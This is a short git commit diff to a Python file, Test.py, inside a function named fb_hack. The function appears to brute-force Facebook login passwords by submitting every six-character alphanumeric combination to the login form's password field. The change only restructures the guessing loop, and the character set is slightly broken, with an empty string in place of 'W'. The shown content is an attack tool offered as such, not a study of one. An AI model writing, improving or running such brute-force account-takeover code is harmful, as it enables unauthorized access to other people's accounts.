1c4a8f847222017ad95e04ca565f6a7344a91db1
krarktel112 <krarktel@gmail.com>
2024-09-23 15:30:25 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -77,7 +77,10 @@ def fb_hack(email, codex, search):
   browser.submit()
   counter = 0
   for combination in itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    browser.form['pass'] = (''.join(map(str, combination)))
+    x = (''.join(map(str, combination)))
+    browser.form['pass'] = x
+    test = (x, " failed")
+    
     counter += 1
     print(int(counter), end='\r')
 
